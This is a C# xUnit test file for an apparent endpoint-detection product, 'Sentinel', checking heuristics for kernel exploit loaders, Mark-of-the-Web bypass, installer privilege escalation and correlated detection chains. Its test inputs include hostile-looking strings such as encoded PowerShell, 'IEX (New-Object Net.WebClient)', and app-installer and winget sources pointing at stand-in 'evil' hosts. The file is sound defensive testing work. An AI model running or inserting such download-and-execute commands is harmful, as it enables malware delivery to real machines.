using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    public class CveCoverageExpansionTests
    {
        [Fact]
        public void AllMonitorTypes_LiveInSentinelCore_NotAHiddenNamespace()
        {
            Assert.Equal("Sentinel.Core", typeof(CveClassCoverageMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(MotwBypassMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(ContainerIsolationTamperMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(DreamJobCampaignMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(EdrKillerDetectionMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(HoneypotDllMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(DecoyPipeMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(KernelModuleAuditMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(TokenPrivilegeAuditMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(UdpFlowMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(IcmpAnomalyMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(WfpNetEventMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(VoipSessionMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(CovertMeshMonitor).Namespace);
            Assert.Equal("Sentinel.Core", typeof(CovertWebhookMonitor).Namespace);
        }

        [Theory]
        [InlineData("Afd4Eop12_x64.exe", true)]
        [InlineData(@"C:\Users\x\Downloads\CVE-2026-61348.exe", true)]
        [InlineData("KernelEoP.exe", true)]
        [InlineData("chrome.exe", false)]
        [InlineData("msiexec.exe", false)]
        public void KernelExploitLoader_Name(string name, bool expected)
        {
            Assert.Equal(expected, CveCoverageHeuristics.IsKernelExploitLoaderName(name));
        }

        [Fact]
        public void DeviceIoctl_And_CveId()
        {
            Assert.True(CveCoverageHeuristics.ContainsDeviceIoctlPrimitive(@"\\.\Afd handle open"));
            Assert.True(CveCoverageHeuristics.ContainsDeviceIoctlPrimitive(@"NtDeviceIoControlFile \Device\Afd"));
            Assert.False(CveCoverageHeuristics.ContainsDeviceIoctlPrimitive("chrome https://example.com"));
            Assert.True(CveCoverageHeuristics.LooksLikeCveId("payload CVE-2026-68820.bin"));
            Assert.False(CveCoverageHeuristics.LooksLikeCveId("chrome"));
        }

        [Fact]
        public void ClickFix_And_AppInstaller()
        {
            Assert.True(CveCoverageHeuristics.IsClickFixEncodedCommand("powershell -enc SQBFAFgA"));
            Assert.True(CveCoverageHeuristics.IsClickFixEncodedCommand("powershell -EncodedCommand aabb"));
            Assert.True(CveCoverageHeuristics.IsClickFixEncodedCommand("IEX (New-Object Net.WebClient)"));
            Assert.False(CveCoverageHeuristics.IsClickFixEncodedCommand("powershell Get-Process"));
            Assert.True(CveCoverageHeuristics.IsAppInstallerProtocol("ms-appinstaller:?source=https://evil/app.appinstaller"));
            Assert.True(CveCoverageHeuristics.IsUntrustedWingetSource("winget source add -n evil http://evil.example/"));
            Assert.False(CveCoverageHeuristics.IsUntrustedWingetSource("winget install Microsoft.VisualStudioCode"));
        }

        [Fact]
        public void MsiFromStaging_And_DiskImage()
        {
            Assert.True(CveCoverageHeuristics.IsMsiFromStaging(@"msiexec /i C:\Users\x\Downloads\payload.msi /qn"));
            Assert.False(CveCoverageHeuristics.IsMsiFromStaging(@"msiexec /i C:\Windows\Installer\foo.msi"));
            Assert.True(CveCoverageHeuristics.IsDiskImagePath(@"C:\Users\x\Downloads\setup.iso"));
            Assert.True(CveCoverageHeuristics.IsDiskImagePath(@"game.vhdx"));
            Assert.False(CveCoverageHeuristics.IsDiskImagePath("readme.txt"));
            Assert.True(CveCoverageHeuristics.IsScriptDropperExtension("drop.hta"));
            Assert.True(CveCoverageHeuristics.IsAppInstallerPackagePath("sideload.appx"));
            Assert.True(CveCoverageHeuristics.IsIsolationDriverName("unionfs.sys"));
            Assert.True(CveCoverageHeuristics.IsIsolationDriverName(@"C:\Temp\wcifs.sys"));
            Assert.False(CveCoverageHeuristics.IsIsolationDriverName("afd.sys"));
        }

        [Fact]
        public void VsCode_LolBin_Midi()
        {
            Assert.True(CveCoverageHeuristics.IsVsCodeHost("Code"));
            Assert.True(CveCoverageHeuristics.IsVsCodeHost("Cursor.exe"));
            Assert.False(CveCoverageHeuristics.IsVsCodeHost("chrome"));
            Assert.True(CveCoverageHeuristics.IsLolBinName("powershell"));
            Assert.True(CveCoverageHeuristics.IsLolBinName("mshta.exe"));
            Assert.False(CveCoverageHeuristics.IsLolBinName("explorer"));
            Assert.True(CveCoverageHeuristics.IsMidiServiceProcess("midisrv"));
        }

        [Fact]
        public void PatchTuesday_August2026_Is_August11()
        {
            var pt = CveCoverageHeuristics.MostRecentPatchTuesday(new DateTime(2026, 8, 24));
            Assert.Equal(new DateTime(2026, 8, 11), pt);
        }

        [Fact]
        public void MissedPatchTuesday_Grace_And_Install()
        {
            var asOf = new DateTime(2026, 8, 24);
            Assert.True(CveCoverageHeuristics.MissedLatestPatchTuesday(new DateTime(2026, 7, 14), asOf));
            Assert.False(CveCoverageHeuristics.MissedLatestPatchTuesday(new DateTime(2026, 8, 12), asOf));
            Assert.False(CveCoverageHeuristics.MissedLatestPatchTuesday(null, asOf));

            // Inside 7-day grace after Aug 11
            Assert.False(CveCoverageHeuristics.MissedLatestPatchTuesday(
                new DateTime(2026, 7, 14), new DateTime(2026, 8, 14)));
            Assert.True(CveCoverageHeuristics.MissedLatestPatchTuesday(
                new DateTime(2026, 7, 14), new DateTime(2026, 8, 19)));
        }

        [Fact]
        public void KevMatch_WindowsOs_DoesNotDeployProcessRules()
        {
            var match = CveCoverageHeuristics.ClassifyKevForWorkstation(
                "CVE-2026-61348", "Microsoft",
                "Windows Ancillary Function Driver for WinSock",
                Array.Empty<string>(), Array.Empty<string>());
            Assert.True(match.Matched);
            Assert.Equal("WorkstationOs", match.MatchType);
            Assert.False(match.DeployProcessRules);
        }

        [Fact]
        public void KevMatch_SharePointAbsent_NoMatch()
        {
            var match = CveCoverageHeuristics.ClassifyKevForWorkstation(
                "CVE-2026-50522", "Microsoft", "SharePoint Server",
                Array.Empty<string>(), Array.Empty<string>());
            Assert.False(match.Matched);
            Assert.Equal("ServerRoleAbsent", match.MatchType);
        }

        [Fact]
        public void KevMatch_SharePointInstalled_Matches()
        {
            var match = CveCoverageHeuristics.ClassifyKevForWorkstation(
                "CVE-2026-50522", "Microsoft", "SharePoint Server",
                new[] { "Microsoft SharePoint Server 2019" }, Array.Empty<string>());
            Assert.True(match.Matched);
            Assert.True(match.DeployProcessRules);
        }

        [Fact]
        public void KevMatch_RunningProcess_Matches()
        {
            var match = CveCoverageHeuristics.ClassifyKevForWorkstation(
                "CVE-2026-9999", "Microsoft", "dotnet",
                Array.Empty<string>(), new[] { "dotnet", "Idle" });
            Assert.True(match.Matched);
            Assert.Equal("RunningProcess", match.MatchType);
            Assert.True(match.DeployProcessRules);
        }

        [Fact]
        public void VulnerabilityClass_FromName()
        {
            Assert.Equal("EoP", CveCoverageHeuristics.VulnerabilityClass(
                "Windows Installer Elevation of Privilege Vulnerability", ""));
            Assert.Equal("RCE", CveCoverageHeuristics.VulnerabilityClass(
                "Microsoft SharePoint Remote Code Execution Vulnerability", ""));
            Assert.Equal("SFB", CveCoverageHeuristics.VulnerabilityClass(
                "Visual Studio Code Security Feature Bypass Vulnerability", ""));
        }

        [Fact]
        public void Motw_ZoneIdentifier_RoundTrip()
        {
            var dir = Path.Combine(Path.GetTempPath(), "motw_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            try
            {
                var pe = Path.Combine(dir, "payload.exe");
                File.WriteAllText(pe, "MZ");
                Assert.False(MotwBypassMonitor.HasZoneIdentifier(pe));

                // net48 FileStream rejects ADS colons; kernel32 CreateFile does not.
                AdsWrite(pe + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\n");
                Assert.True(MotwBypassMonitor.HasZoneIdentifier(pe));
            }
            finally
            {
                try { Directory.Delete(dir, true); } catch { }
            }
        }

        [Fact]
        public async Task Composite_KernelExploitLoaderChain_Fires()
        {
            var engine = new BehavioralCorrelationEngine();
            DetectionEvent? composite = null;
            engine.Initialize(ev =>
            {
                composite = ev;
                return Task.CompletedTask;
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "CVE Class: Kernel Exploit Loader",
                ProcessId = 5150,
                ProcessName = "AfdEoP.exe",
                SignalType = SignalType.SecurityEvasion,
                Timestamp = DateTime.UtcNow
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "Token Theft: SYSTEM Impersonation",
                ProcessId = 5150,
                ProcessName = "AfdEoP.exe",
                SignalType = SignalType.SecurityEvasion,
                Timestamp = DateTime.UtcNow
            });

            Assert.NotNull(composite);
            Assert.Equal("Kernel Exploit Loader Chain", composite!.RuleName);
            Assert.True(composite.Confidence >= 0.90);
            Assert.Equal(DetectionTier.Tier1Behavioral, composite.Tier);
        }

        [Fact]
        public async Task Composite_InstallerEopChain_Fires()
        {
            var engine = new BehavioralCorrelationEngine();
            DetectionEvent? composite = null;
            engine.Initialize(ev =>
            {
                composite = ev;
                return Task.CompletedTask;
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "CVE Class: Installer EoP from Staging",
                ProcessId = 6161,
                ProcessName = "msiexec",
                SignalType = SignalType.SecurityEvasion,
                Timestamp = DateTime.UtcNow
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "LPE Scaffold: Privilege Escalation Tool",
                ProcessId = 6161,
                ProcessName = "msiexec",
                SignalType = SignalType.SecurityEvasion,
                Timestamp = DateTime.UtcNow
            });

            Assert.NotNull(composite);
            Assert.True(
                composite!.RuleName == "Installer / Package Manager EoP Chain" ||
                composite.RuleName == "LPE Campaign Scaffold",
                $"Unexpected composite: {composite.RuleName}");
        }

        [Fact]
        public async Task Composite_MotwBypassExecutionChain_Fires()
        {
            var engine = new BehavioralCorrelationEngine();
            DetectionEvent? composite = null;
            engine.Initialize(ev =>
            {
                composite = ev;
                return Task.CompletedTask;
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "CVE Class: ClickFix Encoded Run",
                ProcessId = 7171,
                ProcessName = "powershell",
                SignalType = SignalType.SuspiciousProcess,
                Timestamp = DateTime.UtcNow
            });

            await engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "C2 Beaconing",
                ProcessId = 7171,
                ProcessName = "powershell",
                SignalType = SignalType.NetworkC2,
                Timestamp = DateTime.UtcNow
            });

            Assert.NotNull(composite);
            Assert.True(
                composite!.RuleName == "MOTW Bypass Execution Chain" ||
                composite.RuleName.Contains("C2") ||
                composite.RuleName.Contains("Dropped Payload"),
                $"Unexpected composite: {composite.RuleName}");
        }

        [Fact]
        public void WeightedCategory_KernelExploitLoader_IsPrivilegeEscalation()
        {
            var cat = WeightedCorrelationEngine.MapWeightCategory(new DetectionEvent
            {
                RuleName = "CVE Class: Kernel Exploit Loader"
            });
            Assert.Equal("PrivilegeEscalation", cat);
        }

        [Fact]
        public void AttackTechniqueMap_ResolvesNewCveClassRules()
        {
            var ids = AttackTechniqueMap.Resolve("CVE Class: Kernel Exploit Loader");
            Assert.Contains("T1068", ids);
            var motw = AttackTechniqueMap.Resolve("CVE Class: PE Missing Mark-of-the-Web");
            Assert.Contains("T1553.005", motw);
        }

        [Fact]
        public void ResponsePolicy_KernelExploitLoader_IsKillGrade_CompositeIsNuke()
        {
            var seed = new DetectionEvent
            {
                RuleName = "CVE Class: Kernel Exploit Loader",
                Confidence = 0.86,
                Tier = DetectionTier.Tier1Behavioral,
                ProcessId = 9,
                ProcessName = "eop",
                AuthorizedResponse = ResponseAction.KillProcessTree,
            };
            Assert.False(ResponsePolicy.IsWeakObserveSeed(seed));
            Assert.True(ResponsePolicy.IsAttackClassTerminal(seed));
            Assert.Equal("TokenTheft", ResponsePolicy.ClassifyTerminalOutcome(seed));
            Assert.False(ResponsePolicy.IsNukeComposite(seed));

            var composite = new DetectionEvent
            {
                RuleName = "Kernel Exploit Loader Chain",
                Confidence = 0.94,
                Tier = DetectionTier.Tier1Behavioral,
                ProcessId = 9,
                ProcessName = "eop",
                AuthorizedResponse = ResponseAction.QuarantineAndKill,
                Metadata = new Dictionary<string, string>()
            };
            Assert.True(ResponsePolicy.IsNukeComposite(composite));
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateFileW(
            string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes,
            uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint GenericWrite = 0x40000000;
        private const uint FileShareReadWriteDelete = 0x00000007;
        private const uint CreateAlways = 2;
        private static readonly IntPtr InvalidHandle = new IntPtr(-1);

        private static void AdsWrite(string adsPath, string contents)
        {
            var handle = CreateFileW(adsPath, GenericWrite, FileShareReadWriteDelete, IntPtr.Zero,
                CreateAlways, 0, IntPtr.Zero);
            Assert.NotEqual(InvalidHandle, handle);
            try
            {
                var bytes = Encoding.ASCII.GetBytes(contents);
                Assert.True(WriteFile(handle, bytes, (uint)bytes.Length, out _, IntPtr.Zero));
            }
            finally
            {
                CloseHandle(handle);
            }
        }
    }
}
